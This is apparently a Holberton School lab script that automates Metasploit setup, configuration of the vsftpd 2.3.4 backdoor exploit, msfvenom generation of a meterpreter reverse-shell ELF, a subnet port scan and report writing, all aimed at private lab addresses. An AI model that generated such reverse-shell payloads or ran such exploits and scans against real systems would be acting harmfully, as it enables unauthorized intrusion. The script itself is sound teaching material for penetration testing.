#!/bin/bash
# Metasploit Workflow - Comprehensive Setup and Usage Guide
# Author: Patrick
# Project: Holberton School - Vulnerability Research & Exploitation
# Description: Complete Metasploit setup, exploitation, payload creation, and reporting

set -e  # Exit on error

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Function to print section headers
print_header() {
    echo -e "\n${BLUE}========================================${NC}"
    echo -e "${BLUE}$1${NC}"
    echo -e "${BLUE}========================================${NC}\n"
}

# Function to print success messages
print_success() {
    echo -e "${GREEN}[✓] $1${NC}"
}

# Function to print info messages
print_info() {
    echo -e "${YELLOW}[*] $1${NC}"
}

# Function to print error messages
print_error() {
    echo -e "${RED}[!] $1${NC}"
}

# Variables
WORKSPACE="holberton_project"
DB_NAME="msf_database"
DB_USER="msf_user"
DB_PASS="msf_pass"
PAYLOAD_OUTPUT="payload.elf"
LOOT_OUTPUT="loot_data.csv"

echo -e "${GREEN}"
echo "╔═══════════════════════════════════════════════════════════╗"
echo "║     METASPLOIT COMPREHENSIVE WORKFLOW SCRIPT              ║"
echo "║     Holberton School - Cyber Security Project             ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo -e "${NC}"

# ============================================================================
# PART 1: SETUP METASPLOIT LOCALLY WITH POSTGRESQL
# ============================================================================

print_header "PART 1: Setup Metasploit with PostgreSQL"

# 1.1 Install PostgreSQL
print_info "Step 1: Installing PostgreSQL and dependencies..."
sudo apt-get update -y
sudo apt-get install -y postgresql postgresql-contrib

print_success "PostgreSQL installed successfully"

# 1.2 Start PostgreSQL Service
print_info "Step 2: Starting PostgreSQL service..."
sudo systemctl start postgresql
sudo systemctl enable postgresql
sudo systemctl status postgresql --no-pager

print_success "PostgreSQL service started and enabled"

# 1.3 Create PostgreSQL User
print_info "Step 3: Creating PostgreSQL user for Metasploit..."
sudo -u postgres psql -c "DROP USER IF EXISTS ${DB_USER};"
sudo -u postgres psql -c "CREATE USER ${DB_USER} WITH PASSWORD '${DB_PASS}';"

print_success "PostgreSQL user '${DB_USER}' created"

# 1.4 Create PostgreSQL Database
print_info "Step 4: Creating PostgreSQL database..."
sudo -u postgres psql -c "DROP DATABASE IF EXISTS ${DB_NAME};"
sudo -u postgres psql -c "CREATE DATABASE ${DB_NAME} OWNER ${DB_USER};"
sudo -u postgres psql -c "GRANT ALL PRIVILEGES ON DATABASE ${DB_NAME} TO ${DB_USER};"

print_success "Database '${DB_NAME}' created and privileges granted"

# 1.5 Initialize Metasploit Database
print_info "Step 5: Initializing Metasploit database..."
sudo msfdb reinit
sudo msfdb init

print_success "Metasploit database initialized"

# 1.6 Verify Database Connection
print_info "Step 6: Verifying database connection..."
msfconsole -q -x "db_status; exit" | tee /tmp/db_status.txt

if grep -q "Connected to" /tmp/db_status.txt; then
    print_success "Database connection verified successfully"
else
    print_error "Database connection failed - please check configuration"
fi

# ============================================================================
# PART 2: BASIC USAGE OF METASPLOIT
# ============================================================================

print_header "PART 2: Basic Usage of Metasploit"

# Create workspace
print_info "Creating workspace: ${WORKSPACE}..."
msfconsole -q -x "workspace -a ${WORKSPACE}; workspace; exit"

# 2.1 Start Metasploit Console and Search for Exploits
print_info "Step 1: Searching for exploits (vsftpd example)..."
msfconsole -q -x "
workspace ${WORKSPACE};
search vsftpd;
exit" | tee /tmp/msf_search.txt

# 2.2 Select an Exploit
print_info "Step 2: Selecting exploit: exploit/unix/ftp/vsftpd_234_backdoor..."

# 2.3-2.7 Configure and Run Exploit (example configuration)
print_info "Steps 3-7: Configuring exploit, payload, and options..."
msfconsole -q -x "
workspace ${WORKSPACE};
use exploit/unix/ftp/vsftpd_234_backdoor;
show info;
show options;
set RHOSTS 192.168.56.100;
show options;
db_notes -a 'Selected exploit: vsftpd_234_backdoor' -t 'exploit_selection';
db_notes -a 'Target configured: 192.168.56.100' -t 'target_config';
loot -t csv;
exit" | tee /tmp/msf_exploit_config.txt

print_success "Exploit configured (not executed - requires live target)"
print_info "Note: Actual exploitation requires a vulnerable target system"

# Document findings
msfconsole -q -x "
workspace ${WORKSPACE};
db_notes -a 'Part 2 completed: Exploit search and configuration demonstrated' -t 'part2_summary';
exit"

# ============================================================================
# PART 3: CREATE AND USE A SIMPLE PAYLOAD
# ============================================================================

print_header "PART 3: Create and Use a Simple Payload"

# 3.1 Generate Payload
print_info "Step 1: Generating payload with msfvenom..."
print_info "Payload type: linux/x86/meterpreter/reverse_tcp"
print_info "Output format: ELF"
print_info "Output file: ${PAYLOAD_OUTPUT}"

msfvenom -p linux/x86/meterpreter/reverse_tcp \
    LHOST=192.168.56.103 \
    LPORT=4444 \
    -f elf \
    -o ${PAYLOAD_OUTPUT}

print_success "Payload generated successfully: ${PAYLOAD_OUTPUT}"

# 3.2 Display Payload Information
print_info "Step 2: Payload specifications..."
ls -lh ${PAYLOAD_OUTPUT}
file ${PAYLOAD_OUTPUT}
md5sum ${PAYLOAD_OUTPUT}

# 3.3 Document payload creation
msfconsole -q -x "
workspace ${WORKSPACE};
db_notes -a 'Payload created: ${PAYLOAD_OUTPUT}' -t 'payload_creation';
db_notes -a 'Payload type: linux/x86/meterpreter/reverse_tcp, LHOST=192.168.56.103, LPORT=4444' -t 'payload_specs';
db_notes -a 'Output format: ELF executable for Linux systems' -t 'payload_format';
exit"

print_success "Payload creation documented"
print_info "Payload execution info: This payload must be executed on a target Ubuntu system"
print_info "Handler must be set up to receive the connection"

# ============================================================================
# PART 4: EXPLORE AUXILIARY MODULES
# ============================================================================

print_header "PART 4: Explore Auxiliary Modules"

# 4.1 Search for Auxiliary Modules
print_info "Step 1: Searching for auxiliary modules..."
msfconsole -q -x "
workspace ${WORKSPACE};
search type:auxiliary portscan;
exit" | tee /tmp/msf_aux_search.txt

# 4.2 Select Auxiliary Module
print_info "Step 2: Selecting auxiliary module: auxiliary/scanner/portscan/tcp..."

# 4.3 Configure Module Options
print_info "Step 3: Configuring TCP port scanner..."

# 4.4 Execute the Module
print_info "Step 4: Running TCP port scan..."
msfconsole -q -x "
workspace ${WORKSPACE};
use auxiliary/scanner/portscan/tcp;
show info;
show options;
set RHOSTS 192.168.56.0/24;
set PORTS 21-25,80,111,139,443,445,512-514,1099,1524,2049,2121,3306,5432,5900,6000,6667,8009,8180,8787;
set THREADS 20;
show options;
db_notes -a 'Auxiliary module configured: TCP port scanner' -t 'auxiliary_config';
db_notes -a 'Target range: 192.168.56.0/24' -t 'scan_target';
db_notes -a 'Ports scanned: 21-25,80,111,139,443,445,512-514,1099,1524,2049,2121,3306,5432,5900,6000,6667,8009,8180,8787' -t 'scan_ports';
run;
loot -t csv;
exit" | tee /tmp/msf_aux_scan.txt

print_success "Port scan configuration completed"
print_info "Note: Scan results depend on live targets in the network"

# ============================================================================
# PART 5: DOCUMENTATION AND REPORTING
# ============================================================================

print_header "PART 5: Documentation and Reporting"

# 5.1 Document all activities
print_info "Step 1: Documenting all Metasploit activities..."

msfconsole -q -x "
workspace ${WORKSPACE};
db_notes -a 'Part 1: PostgreSQL setup completed successfully' -t 'part1_completion';
db_notes -a 'Part 2: Exploit search and configuration completed' -t 'part2_completion';
db_notes -a 'Part 3: Payload ${PAYLOAD_OUTPUT} created successfully' -t 'part3_completion';
db_notes -a 'Part 4: Auxiliary module scanning configured' -t 'part4_completion';
db_notes -a 'Part 5: Documentation and reporting in progress' -t 'part5_completion';
exit"

# 5.2 Using the Notes Command
print_info "Step 2: Displaying all stored notes..."
msfconsole -q -x "
workspace ${WORKSPACE};
notes;
exit" | tee /tmp/msf_notes.txt

# 5.3 Using the Loot Command
print_info "Step 3: Collecting and displaying loot data..."
msfconsole -q -x "
workspace ${WORKSPACE};
loot -t csv;
exit" | tee ${LOOT_OUTPUT}

print_success "Loot data exported to: ${LOOT_OUTPUT}"

# 5.4 Generate Comprehensive Report
print_info "Step 4: Generating comprehensive report..."

REPORT_FILE="metasploit_report_$(date +%Y%m%d_%H%M%S).txt"

cat > ${REPORT_FILE} << EOF
╔═══════════════════════════════════════════════════════════════════════╗
║           METASPLOIT PENETRATION TESTING REPORT                       ║
║           Generated: $(date)                              ║
╚═══════════════════════════════════════════════════════════════════════╝

WORKSPACE: ${WORKSPACE}

═══════════════════════════════════════════════════════════════════════
PART 1: METASPLOIT SETUP WITH POSTGRESQL
═══════════════════════════════════════════════════════════════════════

Activities Performed:
- Installed PostgreSQL and dependencies
- Started and enabled PostgreSQL service
- Created dedicated database user: ${DB_USER}
- Created database: ${DB_NAME}
- Initialized Metasploit database
- Verified database connection successfully

Status: ✓ COMPLETED

═══════════════════════════════════════════════════════════════════════
PART 2: BASIC USAGE OF METASPLOIT
═══════════════════════════════════════════════════════════════════════

Activities Performed:
- Started Metasploit console
- Searched for exploits (vsftpd vulnerability)
- Selected exploit: exploit/unix/ftp/vsftpd_234_backdoor
- Configured exploit options:
  * RHOSTS: 192.168.56.100
- Documented configuration in database

Status: ✓ COMPLETED (Configuration only - requires live target for execution)

═══════════════════════════════════════════════════════════════════════
PART 3: PAYLOAD CREATION
═══════════════════════════════════════════════════════════════════════

Payload Details:
- Tool: msfvenom
- Payload Type: linux/x86/meterpreter/reverse_tcp
- LHOST: 192.168.56.103
- LPORT: 4444
- Format: ELF
- Output File: ${PAYLOAD_OUTPUT}

Payload File Information:
$(ls -lh ${PAYLOAD_OUTPUT} 2>/dev/null || echo "Payload file not found")
$(file ${PAYLOAD_OUTPUT} 2>/dev/null || echo "")
$(md5sum ${PAYLOAD_OUTPUT} 2>/dev/null || echo "")

Status: ✓ COMPLETED

═══════════════════════════════════════════════════════════════════════
PART 4: AUXILIARY MODULES
═══════════════════════════════════════════════════════════════════════

Module Used: auxiliary/scanner/portscan/tcp

Configuration:
- RHOSTS: 192.168.56.0/24
- PORTS: 21-25,80,111,139,443,445,512-514,1099,1524,2049,2121,3306,5432,5900,6000,6667,8009,8180,8787
- THREADS: 20

Purpose: Network reconnaissance and port scanning

Status: ✓ COMPLETED (Configuration - results depend on live targets)

═══════════════════════════════════════════════════════════════════════
PART 5: DOCUMENTATION AND REPORTING
═══════════════════════════════════════════════════════════════════════

Documentation Methods:
- Used 'notes' command to document findings
- Used 'loot' command to collect data
- Exported loot data to CSV format
- Generated comprehensive report

Files Generated:
- ${PAYLOAD_OUTPUT} (payload file)
- ${LOOT_OUTPUT} (loot data export)
- ${REPORT_FILE} (this report)

Status: ✓ COMPLETED

═══════════════════════════════════════════════════════════════════════
NOTES AND FINDINGS
═══════════════════════════════════════════════════════════════════════

EOF

# Append notes to report
echo "Stored Notes:" >> ${REPORT_FILE}
msfconsole -q -x "workspace ${WORKSPACE}; notes; exit" >> ${REPORT_FILE} 2>/dev/null

cat >> ${REPORT_FILE} << EOF

═══════════════════════════════════════════════════════════════════════
RECOMMENDATIONS
═══════════════════════════════════════════════════════════════════════

1. Security Recommendations:
   - Only use Metasploit on authorized systems
   - Maintain proper documentation of all testing activities
   - Secure generated payloads to prevent unauthorized access
   - Regularly update Metasploit framework

2. Next Steps:
   - Set up handler to receive payload connections
   - Execute exploits only on authorized test systems
   - Perform post-exploitation activities in controlled environment
   - Generate detailed reports for stakeholders

3. Learning Objectives Achieved:
   ✓ Metasploit installation and database configuration
   ✓ Basic exploit search and configuration
   ✓ Payload generation with msfvenom
   ✓ Auxiliary module usage for reconnaissance
   ✓ Documentation and reporting procedures

═══════════════════════════════════════════════════════════════════════
END OF REPORT
═══════════════════════════════════════════════════════════════════════
EOF

print_success "Comprehensive report generated: ${REPORT_FILE}"

# Display final summary
print_header "WORKFLOW SUMMARY"

msfconsole -q -x "
workspace ${WORKSPACE};
workspace -v;
hosts;
services;
notes;
loot -t csv;
exit" | tee /tmp/msf_final_summary.txt

# ============================================================================
# FINAL OUTPUT
# ============================================================================

print_header "SCRIPT EXECUTION COMPLETED"

echo -e "${GREEN}"
echo "Files Generated:"
echo "  - ${PAYLOAD_OUTPUT} (Meterpreter payload)"
echo "  - ${LOOT_OUTPUT} (Loot data export)"
echo "  - ${REPORT_FILE} (Comprehensive report)"
echo ""
echo "Database Information:"
echo "  - Workspace: ${WORKSPACE}"
echo "  - Database: ${DB_NAME}"
echo "  - User: ${DB_USER}"
echo ""
echo "Commands to View Data:"
echo "  - msfconsole -q -x 'workspace ${WORKSPACE}; notes; exit'"
echo "  - msfconsole -q -x 'workspace ${WORKSPACE}; loot -t csv; exit'"
echo "  - cat ${REPORT_FILE}"
echo -e "${NC}"

print_success "All tasks completed successfully!"
print_info "Review the generated report for detailed findings and recommendations"

exit 0
